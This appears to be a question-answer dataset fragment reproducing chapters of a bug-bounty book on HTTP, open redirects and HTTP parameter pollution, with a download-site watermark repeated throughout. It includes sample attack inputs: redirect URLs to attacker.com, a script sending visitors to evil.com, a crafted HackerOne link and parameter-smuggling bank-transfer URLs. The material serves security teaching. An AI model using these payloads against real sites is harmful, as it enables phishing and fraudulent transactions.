important because it\nindicates how the server is responding. Also defined by RFC, these\ncodes typically have three-digit numbers that begin with 2, 3, 4, or 5.\nAlthough there is no strict requirement for servers to use specific\ncodes, 2xx codes typically indicate a request was successful.\nBecause there is no strict enforcement of how a server implements\nits use of HTTP codes, you might see some applications respond with\na 200 even though the HTTP message body explains there was an\napplication error. An HTTP message body is the text associated with a\nrequest or response ➌. In this case, we’ve removed the content and\nreplaced it with --snip-- because of how big the response body from\nGoogle is. This text in a response is usually the HTML for a web page\nbut could be JSON for an application programming interface, file\ncontents for a file download, and so on.\nThe Content-Type header ➋ informs the browsers of the body’s\nmedia type. The media type determines how a browser will render\nbody contents. But browsers don’t always use the value returned from\nan application; instead, browsers perform MIME sniffing, reading the\nfirst bit of the body contents to determine the media type for\nthemselves. Applications can disable this browser behavior by\nincluding the header X-Content-Type-Options: nosniff, which is not\nincluded in the preceding example.\nOther response codes starting with 3 indicate a redirection, which\n46\nDownload from www.finelybook.com 7450911@qq.com\ninstructs your browser to make an additional request. For example, if\nGoogle theoretically needed to permanently redirect you from one\nURL to another, it could use a 301 response. In contrast, a 302 is a\ntemporary redirect.\nWhen a 3xx response is received, your browser should make a new\nHTTP request to the URL defined in a Location header, as follows:\nHTTP/1.1 301 Found\nLocation: https://www.google.com/\nResponses starting with a 4 typically indicate a user error, such as\nresponse 403 when a request doesn’t include proper identification to\nauthorize access to content despite providing a valid HTTP request.\nResponses starting with a 5 identify some type of server error, such as\n503, which indicates a server is unavailable to handle the sent request.\nStep 6: Rendering the Response\nBecause the server sent a 200 response with the content type text/html,\nour browser will begin rendering the contents it received. The\nresponse’s body tells the browser what should be presented to the\nuser.\nFor our example, this would include HTML for the page structure;\nCascading Style Sheets (CSS) for the styles and layout; and JavaScript\nto add additional dynamic functionality and media, such as images or\nvideos. It’s possible for the server to return other content, such as\nXML, but we’ll stick to the basics for this example. Chapter 11\ndiscusses XML in more detail.\nBecause it’s possible for web pages to reference external files such\nas CSS, JavaScript, and media, the browser might make additional\nHTTP requests for all a web page’s required files. While the browser\n47\nDownload from www.finelybook.com 7450911@qq.com\nis requesting those additional files, it continues parsing the response\nand presenting the body to you as a web page. In this case, it will\nrender Google’s home page, www.google.com.\nNote that JavaScript is a scripting language supported by every\nmajor browser. JavaScript allows web pages to have dynamic\nfunctionality, including the ability to update content on a web page\nwithout reloading the page, check whether your password is strong\nenough (on some websites), and so on. Like other programming\nlanguages, JavaScript has built-in functions and can store values in\nvariables and run code in response to events on a web page. It also has\naccess to various browser application programming interfaces (APIs).\nThese APIs enable JavaScript to interact with other systems, the most\nimportant of which may be the document object model (DOM).\nThe DOM allows JavaScript to access and manipulate a web\npage’s HTML and CSS. This is significant because if an attacker can\nexecute their own JavaScript on a site, they’ll have access to the DOM\nand can perform actions on the site on behalf of the targeted user.\nChapter 7 explores this concept further.\nHTTP REQUESTS\nThe agreement between client and server on how to handle HTTP\nmessages includes defining request methods. A request method\nindicates the purpose of the client’s request and what the client\nexpects as a successful result. For example, in Listing 1-1, we sent a\nGET request to http://www.google.com/ implying we expect only the\ncontents of http://www.google.com/ to be returned and no other\nactions to be performed. Because the internet is designed as an\ninterface between remote computers, request methods were developed\n48\nDownload from www.finelybook.com 7450911@qq.com\nand implemented to distinguish between the actions being invoked.\nThe HTTP standard defines the following request methods: GET,\nHEAD, POST, PUT, DELETE, TRACE, CONNECT, and OPTIONS (PATCH\nwas also proposed but not commonly implemented in the HTTP\nRFC). At the time of this writing, browsers will only send GET and\nPOST requests using HTML. Any PUT, PATCH, or DELETE request is\nthe result of JavaScript’s invoking the HTTP request. This will have\nimplications later in the book when we consider vulnerability\nexamples in applications expecting these method types.\nThe next section provides a brief overview of request methods\nyou’ll find in this book.\nRequest Methods\nThe GET method retrieves whatever information is identified by the\nrequest Uniform Resource Identifier (URI). The term URI is\ncommonly used synonymously with Uniform Resource Locator\n(URL). Technically, a URL is a type of URI that defines a resource\nand includes a way to locate that resource by way of its network\nlocation. For example, http://www.google.com/<example>/file.txt and\n/<example>/file.txt are valid URIs. But only\nhttp://www.google.com/<example>/file.txt is a valid URL because it\nidentifies how to locate the resource via the domain\nhttp://www.google.com. Despite the nuance, we’ll use URL\nthroughout the book when referencing any resource identifiers.\nWhile there is no way to enforce this requirement, GET requests\nshouldn’t alter data; they should just retrieve data from a server and\nreturn it in the HTTP message body. For example, on a social media\nsite, a GET request should return your profile name but not update\n49\nDownload from www.finelybook.com 7450911@qq.com\nyour profile. This behavior is critical for the cross-site request forgery\n(CSRF) vulnerabilities discussed in Chapter 4. Visiting any URL or\nwebsite link (unless invoked by JavaScript) causes your browser to\nsend a GET request to the intended server. This behavior is crucial to\nthe open redirect vulnerabilities discussed in Chapter 2.\nThe HEAD method is identical to the GET method except the server\nmust not return a message body in the response.\nThe POST method invokes some function on the receiving server,\nas determined by the server. In other words, typically there will be\nsome type of backend action performed, such as creating a comment,\nregistering a user, deleting an account, and so on. The action\nperformed by the server in response to a POST can vary. Sometimes,\nthe server may take no action at all. For example, a POST request\ncould cause an error to occur while a request is being processed, and a\nrecord wouldn’t be saved on the server.\nThe PUT method invokes some function that refers to an already\nexisting record on the remote website or application. For example, it\nmight be used when updating an account, a blog post, or so on that\nalready exists. Again, the action performed can vary and might result\nin the server taking no action at all.\nThe DELETE method requests that the remote server delete a\nremote resource identified with a URI.\nThe TRACE method is another uncommon method; it is used to\nreflect the request message back to the requester. It allows the\nrequester to see what is being received by the server and to use that\ninformation for testing and collecting diagnostic information.\nThe CONNECT method is reserved for use with a proxy, a server\nthat forwards requests to other servers. This method starts two-way\n50\nDownload from www.finelybook.com 7450911@qq.com\ncommunications with a requested resource. For example, the\nCONNECT method can access websites that use HTTPS via a proxy.\nThe OPTIONS method requests information from a server about the\ncommunication options available. For example, by calling for\nOPTIONS, you can find out whether the server accepts GET, POST, PUT,\nDELETE, and OPTIONS calls. This method won’t indicate whether a\nserver accepts HEAD or TRACE calls. Browsers automatically send this\ntype of request for specific content types, such as application/json. This\nmethod, referred to as a preflight OPTIONS call, is discussed more in\ndepth in Chapter 4 because it serves as a CSRF vulnerability\nprotection.\nHTTP Is Stateless\nHTTP requests are stateless, which means that every request sent to a\nserver is treated as a brand-new request. The server knows nothing\nabout its previous communication with your browser when receiving a\nrequest. This is problematic for most sites because the sites want to\nremember who you are. Otherwise, you’d have to reenter your\nusername and password for every HTTP request sent. This also means\nthat all the data required to process an HTTP request must be reloaded\nwith every request a client sends to a server.\nTo clarify this confusing concept, consider this example: if you and\nI had a stateless conversation, before every sentence spoken, I’d have\nto start with “I’m Peter Yaworski; we were just discussing hacking.”\nYou’d then have to reload all the information about what we were\ndiscussing about hacking. Think of what Adam Sandler does for Drew\nBarrymore every morning in 50 First Dates (if you haven’t seen the\nmovie, you should).\n51\nDownload from www.finelybook.com 7450911@qq.com\nTo avoid having to resend your username and password for every\nHTTP request, websites use cookies or basic authentication, which\nwe’ll discuss in detail in Chapter 4.\nNOTE\nThe specifics of how content is encoded using base64 are beyond the scope of this\nbook, but you’ll likely encounter base64-encoded content while you’re hacking. If so,\nyou should always decode that content. A Google search for “base64 decode” should\nprovide plenty of tools and methods for doing this.\nSUMMARY\nYou should now have a basic understanding of how the internet\nworks. Specifically, you learned what happens when you enter a\nwebsite into your browser’s address bar: how the browser translates\nthat to a domain, how the domain is mapped to an IP address, and how\nan HTTP request is sent to a server.\nYou also learned how your browser structures requests and renders\nresponses and how HTTP request methods allow clients to\ncommunicate with servers. Additionally, you learned that\nvulnerabilities result from someone performing an unintended action\nor gaining access to information otherwise not available and that bug\nbounties are rewards for ethically discovering and reporting\nvulnerabilities to the owners of websites.\n52"
  },
  {
    "input": "What is an open redirect vulnerability and how can it be exploited to redirect users to a malicious website?",
    "summary": "Open redirect vulnerabilities allow attackers to trick users into visiting malicious websites by redirecting them through trusted domains. These vulnerabilities often involve parameters like redirect_to or domain_name that can be exploited without complex attacks. The HackerOne interstitial redirect example shows how even with protections, attackers can bypass them by manipulating URLs and using JavaScript, highlighting the importance of understanding a website's tools and services when searching for vulnerabilities.",
    "output": "Download from www.finelybook.com 7450911@qq.com\n2\nOPEN REDIRECT\nWe’ll begin our discussion with open redirect vulnerabilities, which\noccur when a target visits a website and that website sends their\nbrowser to a different URL, potentially on a separate domain. Open\nredirects exploit the trust of a given domain to lure targets to a\nmalicious website. A phishing attack can also accompany a redirect to\ntrick users into believing they’re submitting information to a trusted\nsite when, in reality, their information is being sent to a malicious site.\nWhen combined with other attacks, open redirects can also enable\nattackers to distribute malware from the malicious site or to steal\nOAuth tokens (a topic we’ll explore in Chapter 17).\nBecause open redirects only redirect users, they’re sometimes\nconsidered low impact and not deserving of a bounty. For example,\nthe Google bug bounty program typically considers open redirects too\nlow risk to reward. The Open Web Application Security Project\n(OWASP), which is a community that focuses on application security\nand curates a list of the most critical security flaws in web\napplications, also removed open redirects from its 2017 list of top 10\nvulnerabilities.\n53\nDownload from www.finelybook.com 7450911@qq.com\nAlthough open redirects are low-impact vulnerabilities, they’re\ngreat for learning how browsers handle redirects in general. In this\nchapter, you’ll learn how to exploit open redirects and how to identify\nkey parameters, using three bug reports as examples.\nHOW OPEN REDIRECTS WORK\nOpen redirects occur when a developer mistrusts attacker-controlled\ninput to redirect to another site, usually via a URL parameter, HTML\n<meta> refresh tags, or the DOM window location property.\nMany websites intentionally redirect users to other sites by placing\na destination URL as a parameter in an original URL. The application\nuses this parameter to tell the browser to send a GET request to the\ndestination URL. For example, suppose Google had the functionality\nto redirect users to Gmail by visiting the following URL:\nhttps://www.google.com/?redirect_to=https://www.gmail.com\nIn this scenario, when you visit this URL, Google receives a GET\nHTTP request and uses the redirect_to parameter’s value to determine\nwhere to redirect your browser. After doing so, Google servers return\nan HTTP response with a status code instructing the browser to\nredirect the user. Typically, the status code is 302, but in some cases it\ncould be 301, 303, 307, or 308. These HTTP response codes tell your\nbrowser that a page has been found; however, the code also informs\nthe browser to make a GET request to the redirect_to parameter’s value,\nhttps://www.gmail.com/, which is denoted in the HTTP response’s\nLocation header. The Location header specifies where to redirect GET\nrequests.\nNow, suppose an attacker changed the original URL to the\n54\nDownload from www.finelybook.com 7450911@qq.com\nfollowing:\nhttps://www.google.com/?redirect_to=https://www.attacker.com\nIf Google isn’t validating that the redirect_to parameter is for one of\nits own legitimate sites where it intends to send visitors, an attacker\ncould substitute the parameter with their own URL. As a result, an\nHTTP response could instruct your browser to make a GET request to\nhttps://www.<attacker>.com/. After the attacker has you on their\nmalicious site, they could carry out other attacks.\nWhen looking for these vulnerabilities, keep an eye out for URL\nparameters that include certain names, such as url=, redirect=, next=, and\nso on, which might denote URLs that users will be redirected to. Also\nkeep in mind that redirect parameters might not always be obviously\nnamed; parameters will vary from site to site or even within a site. In\nsome cases, parameters might be labeled with just single characters,\nsuch as r= or u=.\nIn addition to parameter-based attacks, HTML <meta> tags and\nJavaScript can redirect browsers. HTML <meta> tags can tell browsers\nto refresh a web page and make a GET request to a URL defined in the\ntag’s content attribute. Here is what one might look like:\n<meta http-equiv=\"refresh\" content=\"0; url=https://www.google.com/\">\nThe content attribute defines how browsers make an HTTP request\nin two ways. First, the content attribute defines how long the browser\nwaits before making the HTTP request to the URL; in this case, 0\nseconds. Secondly, the content attribute specifies the URL parameter in\nthe website the browser makes the GET request to; in this case,\nhttps://www.google.com. Attackers can use this redirect behavior in\n55\nDownload from www.finelybook.com 7450911@qq.com\nsituations where they have the ability to control the content attribute of\na <meta> tag or to inject their own tag via some other vulnerability.\nAn attacker can also use JavaScript to redirect users by modifying\nthe window’s location property through the Document Object Model\n(DOM). The DOM is an API for HTML and XML documents that\nallows developers to modify the structure, style, and content of a web\npage. Because the location property denotes where a request should be\nredirected to, browsers will immediately interpret this JavaScript and\nredirect to the specified URL. An attacker can modify the window’s\nlocation property by using any of the following JavaScript:\nwindow.location = https://www.google.com/\nwindow.location.href = https://www.google.com\nwindow.location.replace(https://www.google.com)\nTypically, opportunities to set the window.location value occur only\nwhere an attacker can execute JavaScript, either via a cross-site\nscripting vulnerability or where the website intentionally allows users\nto define a URL to redirect to, as in the HackerOne interstitial redirect\nvulnerability detailed later in the chapter on page 15.\nWhen you’re searching for open redirect vulnerabilities, you’ll\nusually be monitoring your proxy history for a GET request sent to the\nsite you’re testing that includes a parameter specifying a URL\nredirect.\nSHOPIFY THEME INSTALL OPEN\nREDIRECT\nDifficulty: Low\nURL:\n56\nDownload from www.finelybook.com 7450911@qq.com\nhttps://apps.shopify.com/services/google/themes/preview/supply--\nblue?domain_name=<anydomain>\nSource: https://www.hackerone.com/reports/101962/\nDate reported: November 25, 2015\nBounty paid: $500\nThe first example of an open redirect you’ll learn about was found on\nShopify, which is a commerce platform that allows people to create\nstores to sell goods. Shopify allows administrators to customize the\nlook and feel of their stores by changing their theme. As part of that\nfunctionality, Shopify offered a feature to provide a preview for the\ntheme by redirecting the store owners to a URL. The redirect URL\nwas formatted as such:\nhttps://app.shopify.com/services/google/themes/preview/supply--blue?\ndomain_name=attacker.com\nThe domain_name parameter at the end of the URL redirected to the\nuser’s store domain and added /admin to the end of the URL. Shopify\nwas expecting that the domain_name would always be a user’s store and\nwasn’t validating its value as part of the Shopify domain. As a result,\nan attacker could exploit the parameter to redirect a target to\nhttp://<attacker>.com/admin/ where the malicious attacker could\ncarry out other attacks.\nTakeaways\nNot all vulnerabilities are complex. For this open redirect, simply\nchanging the domain_name parameter to an external site would redirect\nthe user offsite from Shopify.\n57\nDownload from www.finelybook.com 7450911@qq.com\nSHOPIFY LOGIN OPEN REDIRECT\nDifficulty: Low\nURL: http://mystore.myshopify.com/account/login/\nSource: https://www.hackerone.com/reports/103772/\nDate reported: December 6, 2015\nBounty paid: $500\nThis second example of an open redirect is similar to the first Shopify\nexample except in this case, Shopify’s parameter isn’t redirecting the\nuser to the domain specified by the URL parameter; instead, the open\nredirect tacks the parameter’s value onto the end of a Shopify\nsubdomain. Normally, this functionality would be used to redirect a\nuser to a specific page on a given store. However, attackers can still\nmanipulate these URLs into redirecting the browser away from\nShopify’s subdomain and to an attacker’s website by adding\ncharacters to change the meaning of the URL.\nIn this bug, after the user logged into Shopify, Shopify used the\nparameter checkout_url to redirect the user. For example, let’s say a\ntarget visited this URL:\nhttp://mystore.myshopify.com/account/login?checkout_url=.attacker.com\nThey would have been redirected to the URL\nhttp://mystore.myshopify.com.<attacker>.com/, which isn’t a Shopify\ndomain.\nBecause the URL ends in .<attacker>.com and DNS lookups use\nthe rightmost domain label, the redirect goes to the <attacker>.com\ndomain. So when http://mystore.myshopify.com.<attacker>.com/ is\nsubmitted for DNS lookup, it will match on <attacker>.com, which\n58\nDownload from www.finelybook.com 7450911@qq.com\nShopify doesn’t own, and not myshopify.com as Shopify would have\nintended. Although an attacker wouldn’t be able to freely send a target\nanywhere, they could send a user to another domain by adding special\ncharacters, such as a period, to the values they can manipulate.\nTakeaways\nIf you can only control a portion of the final URL used by a site,\nadding special URL characters might change the meaning of the URL\nand redirect a user to another domain. Let’s say you can only control\nthe checkout_url parameter value, and you also notice that the parameter\nis being combined with a hardcoded URL on the backend of the site,\nsuch as the store URL http://mystore.myshopify.com/. Try adding\nspecial URL characters, like a period or the @ symbol, to test whether\nyou can control the redirected location.\nHACKERONE INTERSTITIAL REDIRECT\nDifficulty: Low\nURL: N/A\nSource: https://www.hackerone.com/reports/111968/\nDate reported: January 20, 2016\nBounty paid: $500\nSome websites try to protect against open redirect vulnerabilities by\nimplementing interstitial web pages, which display before the\nexpected content. Any time you redirect a user to a URL, you can\nshow an interstitial web page with a message explaining to the user\nthat they’re leaving the domain they’re on. As a result, if the redirect\npage shows a fake login or tries to pretend to be the trusted domain,\n59\nDownload from www.finelybook.com 7450911@qq.com\nthe user will know that they’re being redirected. This is the approach\nHackerOne takes when following most URLs off its site; for example,\nwhen following links in submitted reports.\nAlthough you can use interstitial web pages to avoid redirect\nvulnerabilities, complications in the way sites interact with one\nanother can lead to compromised links. HackerOne uses Zendesk, a\ncustomer service support ticketing system, for its\nhttps://support.hackerone.com/ subdomain. Previously, when you\nfollowed hackerone.com with /zendesk_session, the browser\nredirected from HackerOne’s platform to HackerOne’s Zendesk\nplatform without an interstitial page because URLs containing the\nhackerone.com domain were trusted links. (HackerOne now redirects\nhttps://support.hackerone.com to docs.hackerone.com unless you are\nsubmitting a support request via the URL /hc/en-us/requests/new.)\nHowever, anyone could create custom Zendesk accounts and pass\nthem to the /redirect_to_account?state= parameter. The custom Zendesk\naccount could then redirect to another website not owned by Zendesk\nor HackerOne. Because Zendesk allowed for redirecting between\naccounts without interstitial pages, the user could be taken to the\nuntrusted site without warning. As a solution, HackerOne identified\nlinks containing zendesk_session as external links, thereby rendering an\ninterstitial warning page when clicked.\nIn order to confirm this vulnerability, the hacker Mahmoud Jamal\ncreated an account on Zendesk with the subdomain\nhttp://compayn.zendesk.com. He then added the following JavaScript\ncode to the header file using the Zendesk theme editor, which allows\nadministrators to customize their Zendesk site’s look and feel:\n<script>document.location.href = «http://evil.com»;</script>\n60\nDownload from www.finelybook.com 7450911@qq.com\nUsing this JavaScript, Jamal instructed the browser to visit\nhttp://evil.com. The <script> tag denotes code in HTML and document\nrefers to the entire HTML document that Zendesk returns, which is the\ninformation for the web page. The dots and names following document\nare its properties. Properties hold information and values that either\ndescribe an object or can be manipulated to change the object. So you\ncan use the location property to control the web page your browser\ndisplays and use the href subproperty (which is a property of the\nlocation) to redirect the browser to the defined website. Visiting the\nfollowing link redirected targets to Jamal’s Zendesk subdomain,\nwhich made the target’s browser run Jamal’s script and redirected\nthem to http://evil.com:\nhttps://hackerone.com/zendesk_session?\nlocale_id=1&return_to=https://support.hackerone.com/\nping/redirect_to_account?state=compayn:/\nBecause the link includes the domain hackerone.com, the\ninterstitial web page doesn’t display, and the user wouldn’t know the\npage they were visiting is unsafe. Interestingly, Jamal originally\nreported the missing interstitial page redirect issue to Zendesk, but it\nwas disregarded and not marked as a vulnerability. Naturally, he kept\ndigging to see how the missing interstitial could be exploited.\nEventually, he found the JavaScript redirect attack that convinced\nHackerOne to pay him a bounty.\nTakeaways\nAs you search for vulnerabilities, note the services a site uses because\neach represents new attack vectors. This HackerOne vulnerability was\nmade possible by combining HackerOne’s use of Zendesk and the\n61\nDownload from www.finelybook.com 7450911@qq.com\nknown redirect HackerOne was permitting.\nAdditionally, as you find bugs, there will be times when the\nsecurity implications aren’t readily understood by the person reading\nand responding to your report. For this reason, I’ll discuss\nvulnerability reports in Chapter 19, which details the findings you\nshould include in a report, how to build relationships with companies,\nand other information. If you do some work up front and respectfully\nexplain the security implications in your report, your efforts will help\nensure a smoother resolution.\nThat said, there will be times when companies don’t agree with\nyou. If that’s the case, continue to dig like Jamal did and see if you\ncan prove the exploit or combine it with another vulnerability to\ndemonstrate impact.\nSUMMARY\nOpen redirects allow a malicious attacker to redirect people\nunknowingly to a malicious website. Finding them, as you learned\nfrom the example bug reports, often requires keen observation.\nRedirect parameters are sometimes easy to spot when they have names\nlike redirect_to=, domain_name=, or checkout_url=, as mentioned in the\nexamples. Other times, they might have less obvious names, such as\nr=, u=, and so on.\nThe open redirect vulnerability relies on an abuse of trust where\ntargets are tricked into visiting an attacker’s site while thinking they’re\nvisiting a site they recognize. When you spot likely vulnerable\nparameters, be sure to test them thoroughly and add special characters,\nlike a period, if some part of the URL is hardcoded.\nThe HackerOne interstitial redirect shows the importance of\n62\nDownload from www.finelybook.com 7450911@qq.com\nrecognizing the tools and services websites use while you hunt for\nvulnerabilities. Keep in mind that you’ll sometimes need to be\npersistent and clearly demonstrate a vulnerability to persuade a\ncompany to accept your findings and pay a bounty.\n63"
  },
  {
    "input": "What is HTTP parameter pollution and how does it differ between server-side and client-side implementations?",
    "summary": "HTTP parameter pollution (HPP) occurs when attackers manipulate URL parameters to cause unexpected behavior on websites. This vulnerability can be found on both server and client sides, with server-side HPP depending on how the server processes multiple parameters with the same name. Client-side HPP allows attackers to inject parameters into URLs that affect the user's experience. Examples from HackerOne and Twitter demonstrate how HPP can be exploited, highlighting the need for thorough testing and persistence in identifying such vulnerabilities.",
    "output": "Download from www.finelybook.com 7450911@qq.com\n3\nHTTP PARAMETER POLLUTION\nHTTP parameter pollution (HPP) is the process of manipulating how\na website treats the parameters it receives during HTTP requests. The\nvulnerability occurs when an attacker injects extra parameters into a\nrequest and the target website trusts them, leading to unexpected\nbehavior. HPP bugs can happen on the server side or on the client\nside. On the client side, which is usually your browser, you can see the\neffect of your tests. In many cases, HPP vulnerabilities depend on how\nserver-side code uses values passed as parameters, which are\ncontrolled by an attacker. For this reason, finding these vulnerabilities\nmight require more experimentation than other types of bugs.\nIn this chapter, we’ll begin by exploring the differences between\nserver-side HPP and client-side HPP in general. Then I’ll use three\nexamples involving popular social media channels to illustrate how to\nuse HPP to inject parameters on target websites. Specifically, you’ll\nlearn the differences between server- and client-side HPP, how to test\nfor this vulnerability type, and where developers often make mistakes.\nAs you’ll see, finding HPP vulnerabilities requires experimentation\nand persistence but can be worth the effort.\n64\nDownload from www.finelybook.com 7450911@qq.com\nSERVER-SIDE HPP\nIn server-side HPP, you send the servers unexpected information in an\nattempt to make the server-side code return unexpected results. When\nyou make a request to a website, the site’s servers process the request\nand return a response, as discussed in Chapter 1. In some cases, the\nservers don’t just return a web page but also run some code based on\ninformation they receive from the URL that is sent. This code runs\nonly on the servers, so it’s essentially invisible to you: you can see the\ninformation you send and the results you get back, but the code in\nbetween isn’t available. Therefore, you can only infer what’s\nhappening. Because you can’t see how the server’s code functions,\nserver-side HPP depends on you identifying potentially vulnerable\nparameters and experimenting with them.\nLet’s look at an example: a server-side HPP could happen if your\nbank initiated transfers through its website by accepting URL\nparameters that were processed on its servers. Imagine that you could\ntransfer money by entering values in the three URL parameters from,\nto, and amount. Each parameter specifies the account number to\ntransfer money from, the account number to transfer to, and the\namount to transfer, in that order. A URL with these parameters that\ntransfers $5,000 from account number 12345 to account number\n67890 might look like this:\nhttps://www.bank.com/transfer?from=12345&to=67890&amount=5000\nIt’s possible the bank could assume that it will receive only one\nfrom parameter. But what happens if you submit two, as in the\nfollowing URL:\nhttps://www.bank.com/transfer?from=12345&to=67890&amount=5000&from=ABCDEF\n65\nDownload from www.finelybook.com 7450911@qq.com\nThis URL is initially structured in the same way as the first\nexample but appends an extra from parameter that specifies another\nsending account, ABCDEF. In this situation, an attacker would send the\nextra parameter in the hopes that the application would validate the\ntransfer using the first from parameter but withdraw the money using\nthe second one. So, an attacker might be able to execute a transfer\nfrom an account they don’t own if the bank trusted the last from\nparameter it received. Instead of transferring $5,000 from account\n12345 to 67890, the server-side code would use the second parameter\nand send money from account ABCDEF to 67890.\nWhen a server receives multiple parameters with the same name, it\ncan respond in a variety of ways. For example, PHP and Apache use\nthe last occurrence, Apache Tomcat uses the first occurrence, ASP and\nIIS use all occurrences, and so on. Two researchers, Luca Carettoni\nand Stefano di Paolo, provided a detailed presentation on the many\ndifferences between server technologies at the AppSec EU 09\nconference: this information is now available on the OWASP website\nat\nhttps://www.owasp.org/images/b/ba/AppsecEU09_CarettoniDiPaola_\nv0.8.pdf (see slide 9). As a result, there is no single guaranteed process\nfor handling multiple parameter submissions with the same name, and\nfinding HPP vulnerabilities takes some experimentation to confirm\nhow the site you’re testing works.\nThe bank example uses parameters that are obvious. But\nsometimes HPP vulnerabilities occur as a result of hidden server-side\nbehavior from code that isn’t directly visible. For example, let’s say\nyour bank decides to revise the way it processes transfers and changes\nits backend code to not include a from parameter in the URL. This\ntime, the bank will take two parameters, one for the account to transfer\n66\nDownload from www.finelybook.com 7450911@qq.com\nto and the other for the amount to transfer. The account to transfer\nfrom will be set by the server, which is invisible to you. An example\nlink might look like this:\nhttps://www.bank.com/transfer?to=67890&amount=5000\nNormally, the server-side code would be a mystery to us, but for\nthe sake of this example, we know that the bank’s (overtly terrible and\nredundant) server-side Ruby code looks like this:\nuser.account = 12345\ndef prepare_transfer(➊params)\n➋ params << user.account\n➌ transfer_money(params) #user.account (12345) becomes params[2]\nend\ndef transfer_money(params)\n➍ to = params[0]\n➎ amount = params[1]\n➏ from = params[2]\ntransfer(to,amount,from)\nend\nThis code creates two functions, prepare_transfer and transfer_money.\nThe prepare_transfer function takes an array called params ➊, which\ncontains the to and amount parameters from the URL. The array would\nbe [67890,5000], where the array values are sandwiched between\nbrackets and each value is separated by a comma. The first line of the\nfunction ➋ adds the user account information that was defined earlier\nin the code to the end of the array. We end up with the array\n[67890,5000,12345] in params, and then params is passed to transfer_money\n➌. Notice that unlike parameters, arrays don’t have names associated\nwith their values, so the code depends on the array always containing\neach value in order: the account to transfer to is first, the amount to\n67\nDownload from www.finelybook.com 7450911@qq.com\ntransfer is next, and the account to transfer from follows the other two\nvalues. In transfer_money, the order of the values becomes evident as\nthe function assigns each array value to a variable. Because array\nlocations are numbered starting from 0, params[0] accesses the value at\nthe first location in the array, which is 67890 in this case, and assigns it\nto the variable to ➍. The other values are also assigned to variables at\nlines ➎ and ➏. Then the variable names are passed to the transfer\nfunction, not shown in this code snippet, which takes the values and\ntransfers the money.\nIdeally, the URL parameters would always be formatted in the way\nthe code expects. However, an attacker could change the outcome of\nthis logic by passing in a from value to params, as with the following\nURL:\nhttps://www.bank.com/transfer?to=67890&amount=5000&from=ABCDEF\nIn this case, the from parameter is also included in the params array\npassed to the prepare_transfer function; therefore, the array’s values\nwould be [67890,5000,ABCDEF], and adding the user account at ➋\nwould result in [67890,5000,ABCDEF,12345]. As a result, in the\ntransfer_money function called in prepare_transfer, the from variable would\ntake the third parameter, expecting the user.account value 12345, but\nwould actually reference the attacker-passed value ABCDEF ➍.\nCLIENT-SIDE HPP\nClient-side HPP vulnerabilities allow attackers to inject extra\nparameters into a URL to create effects on a user’s end (client side is a\ncommon way of referring to actions that happen on your computer,\noften via the browser, and not on the site’s servers).\n68\nDownload from www.finelybook.com 7450911@qq.com\nLuca Carettoni and Stefano di Paola included an example of this\nbehavior in their presentation using the theoretical URL\nhttp://host/page.php?par=123%26action=edit and the following\nserver-side code:\n➊ <? $val=htmlspecialchars($_GET['par'],ENT_QUOTES); ?>\n➋ <a href=\"/page.php?action=view&par='.<?=$val?>.'\">View Me!</a>\nThis code generates a new URL based on the value of par, a user-\nentered parameter. In this example, the attacker passes the value\n123%26action=edit as the value for par to generate an additional,\nunintended parameter. The URL-encoded value for & is %26, which\nmeans that when the URL is parsed, the %26 is interpreted as &. This\nvalue adds an additional parameter to the generated href without\nmaking the action parameter explicit in the URL. Had the parameter\nused 123&action=edit instead of %26, the & would have been interpreted\nas separating two different parameters, but because the site is only\nusing the parameter par in its code, the action parameter would be\ndropped. The value %26 works around this by making sure action isn’t\ninitially recognized as a separate parameter, and so 123%26action=edit\nbecomes the value of par.\nNext, par (with the encoded & as %26) is passed to the function\nhtmlspecialchars ➊. The htmlspecialchars function converts special\ncharacters, such as %26, to their HTML-encoded values, turning %26\ninto &amp; (the HTML entity that represents & in HTML), where that\ncharacter might have special meaning. The converted value is then\nstored in $val. Then a new link is generated by appending $val to the\nhref value at ➋. So the generated link becomes <a href=\"/page.php?\naction=view&par=123&amp;action=edit\">. Consequently, the attacker has\nmanaged to add the additional action=edit to the href URL, which could\n69\nDownload from www.finelybook.com 7450911@qq.com\nlead to a vulnerability depending on how the application handles the\nsmuggled action parameter.\nThe following three examples detail both client and server-side\nHPP vulnerabilities found on HackerOne and Twitter. All of these\nexamples involved URL parameter tampering. However, you should\nnote that no two examples were found using the same method or share\nthe same root cause, reinforcing the importance of thorough testing\nwhen looking for HPP vulnerabilities.\nHACKERONE SOCIAL SHARING BUTTONS\nDifficulty: Low\nURL: https://hackerone.com/blog/introducing-signal-and-impact/\nSource: https://hackerone.com/reports/105953/\nDate reported: December 18, 2015\nBounty paid: $500\nOne way to find HPP vulnerabilities is to look for links that appear to\ncontact other services. HackerOne blog posts do just that by including\nlinks to share content on popular social media sites, such as Twitter,\nFacebook, and so on. When clicked, these HackerOne links generate\ncontent for the user to publish on social media. The published content\nincludes a URL reference to the original blog post.\nOne hacker discovered a vulnerability that allowed you to tack on a\nparameter to the URL of a HackerOne blog post. The added URL\nparameter would be reflected in the shared social media link so that\nthe generated social media content would link to somewhere other\nthan the intended HackerOne blog URL.\nThe example used in the vulnerability report involved visiting the\n70\nDownload from www.finelybook.com 7450911@qq.com\nURL https://hackerone.com/blog/introducing-signal and then adding\n&u=https://vk.com/durov to the end of it. On the blog page, when\nHackerOne rendered a link to share on Facebook, the link would\nbecome the following:\nhttps://www.facebook.com/sharer.php?u=https://hackerone.com/blog/introducing\n-signal?&u=https://vk.com/durov\nIf HackerOne visitors clicked this maliciously updated link while\ntrying to share content, the last u parameter would be given\nprecedence over the first u parameter. Subsequently, the Facebook\npost would use the last u parameter. Then Facebook users who clicked\nthe link would be directed to https://vk.com/durov instead of\nHackerOne.\nIn addition, when posting to Twitter, HackerOne includes default\ntweet text that promotes the post. Attackers could also manipulate this\ntext by including &text= in the URL, like this:\nhttps://hackerone.com/blog/introducing-signal?&u=https://vk.com/\ndurov&text=another_site:https://vk.com/durov\nWhen a user clicked this link, they would get a tweet pop-up\ncontaining the text “another_site: https://vk.com/durov” instead of text\npromoting the HackerOne blog.\nTakeaways\nBe on the lookout for vulnerability opportunities when websites\naccept content, appear to be contacting another web service (such as\nsocial media sites), and rely on the current URL to generate the\ncontent to be published.\nIn these situations, it’s possible that submitted content is being\n71\nDownload from www.finelybook.com 7450911@qq.com\npassed on without undergoing proper security checks, which could\nlead to parameter pollution vulnerabilities.\nTWITTER UNSUBSCRIBE NOTIFICATIONS\nDifficulty: Low\nURL: https://www.twitter.com/\nSource: https://blog.mert.ninja/twitter-hpp-vulnerability/\nDate reported: August 23, 2015\nBounty paid: $700\nIn some cases, successfully finding an HPP vulnerability 